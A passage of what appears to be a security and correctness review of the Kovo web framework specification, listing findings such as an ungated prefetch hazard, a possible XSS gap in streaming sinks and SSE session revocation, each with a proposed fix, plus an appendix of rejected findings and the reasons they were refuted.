### F36 — `prefetch:'moderate'` is author-declared with no compile gate against guarded / non-idempotent / session-dependent routes — *contested*

- **Sections:** §8, §6.4 · **Category:** security/correctness
- `prefetch:'moderate'` causes the browser to **prerender** (execute the route's `page`+queries with
  the user's credentials) on hover; §8 acknowledges the hazards (analytics, non-idempotent per-user
  renders, discarded-render cost) but leaves it to author discipline with **no compile gate** —
  unlike KV229 (export) / KV320 (events). The refuter argued the marquee side-effect scenario is
  blocked because writes must flow through `domain()`/`mutation()` (KV330) and a write in a GET
  render is caught by §11.2 — softening it; but the **read-amplification / discarded-render and
  analytics hazards** for guarded routes remain ungated.
- [ ] **Fix:** Gate `prefetch:'moderate'` at compile time — emit a KV diagnostic when set on a route
  whose page/meta/queries aren't proven side-effect-free or whose render is session-dependent, unless
  a named justification is supplied (mirroring KV229).

---

## LOW / MINOR (verified real, low impact)

- **F22** — `structuredClone` snapshot of the full query value is unbounded; the `JsonValue`
  constraint bounds serializability, not size, and §10.2 forbids skinny queries, so optimistic
  actions deep-clone large datasets synchronously per mutation/rebase. *Fix:* bound snapshot to the
  change-record-touched subset or use copy-on-write; stop calling full `structuredClone`
  unconditionally "safe." *(both-confirm)*
- **F32** — The `kovo-key` runtime-identity / optimistic-reordering contract cites a **nonexistent
  §13.2** (twice: §4.8 and §9.1.1); two prod-delta soundness claims depend on it. *Fix:* write §13.2
  (keyed reconciliation order-of-operations, morph identity, submitted-form identity, optimistic
  reordering) or repoint the citations. *(both-confirm)*
- **F10** — App-authored streaming **sink renderer** has no escaping obligation, so a markdown/rich
  sink reintroduces the model-output XSS the same §9.1 sentence claims to prevent. *Fix:* constrain
  the sink signature to consume the escaped buffer and return escaped text / a KV236 trusted-HTML
  value. *(contested — local gap real; impact bounded to apps that add an HTML sink)*
- **F15** — Live-push guard re-check has no specified rule for how a long-lived SSE request
  re-resolves `req.session`; if it reuses the connection-time session, a post-subscription privilege
  revocation keeps delivering privileged pushes. *Fix:* require each push to re-resolve the principal
  before the guard re-check and terminate on now-unauthorized. *(contested)*
- **F29** — Prod delta deep-merge semantics are unspecified for nested objects / null-or-absent
  fields / partial keyed rows; "deep-merge" + "sent whole" can retain a stale sub-key the server
  meant to drop. *Fix:* specify that non-keyed scalar/object fields **replace** wholesale, only keyed
  collections merge by identity, the only deletion vocabulary is the removed-key list, and tie the
  prod gate to these rules. *(contested — clarity gap)*

---

## Appendix — findings rejected by both verifiers (not bugs)

Recorded for transparency; each was refuted against specific normative text.

| ID | Claim | Why rejected |
| --- | --- | --- |
| F11 | checkpoint/delta updates lack an escaping contract | `mode="checkpoint"` is the `<kovo-text>` text-only path ("appends text, not HTML"); render-equivalence gates bind client writes to the escaped server render. |
| F14 | Live SSE subscription IDOR via arg-blind guard | Conflates vertical authz (guards) with horizontal ownership (`owner:` + `--unscoped`); session-derived keys aren't client-visible. (Note: the *advisory-audit* concern is captured by F12.) |
| F16 | Post-commit fragment reruns trust client target identity (IDOR) | Session-derived keys resolve to `req.session.*` (not client-visible); `Kovo-Live-Targets` carries only props proven sufficient; reruns re-execute queries server-side. |
| F18 | Multi-query transform settles non-atomically | §10.3: all of a mutation's invalidated queries re-run post-commit in one request context and ship in one response — no cross-query streaming gap. |
| F21 | Single-step commuting diagram doesn't compose over a rebase stack | Composition follows by induction over §10.5's property; intermediate states are real server states. |
| F25 | KV409 table-level invalidation leaves a keyed instance stale | Server doesn't enumerate instances by key — `Kovo-Targets` is read off live DOM stamps; all on-screen instances refresh. |
| F26 | BroadcastChannel applies deltas without base-version validation | §9.1.1 base-version validation is a property of the *apply* operation regardless of transport; mismatch discards + refetches. |
| F31 | Prod delta upserts a row that left a filtered window | Deltas are built from a post-commit query **re-run** (§9.1/§10.3), which is filter-aware, not raw `{domain,keys}`. |
| F37 | Enhanced-nav morph rebases prior optimistic log into a new-session document | Auth-chrome drift / guard uncertainty force full navigation; optimistic log is reconciled or discarded (§8). |
| F38 | Trailing-slash 308 vs dispatch order under-specified for POSTs | The 308 normalization sentence is scoped to route matching; `/_m/`,`/_q/` dispatch precedes it. |
| F41 | KV311 binds status to spatial containment, not the refreshing query | `fragment` status is only awarded to inferred server-refreshable targets gated on a render-input subset proof; the scenario is forbidden. |
| F42 | In-place fragment morph double-runs long-lived handlers | Idiomorph-class morph preserves the island in place (same node, same signal); it isn't removed+re-added. |
| F43 | `disableServerRefresh` leaves fragment-graded positions silently stale | `fragment` is structural membership in a generated target; suppressing the target reclassifies positions, surfacing KV311. |
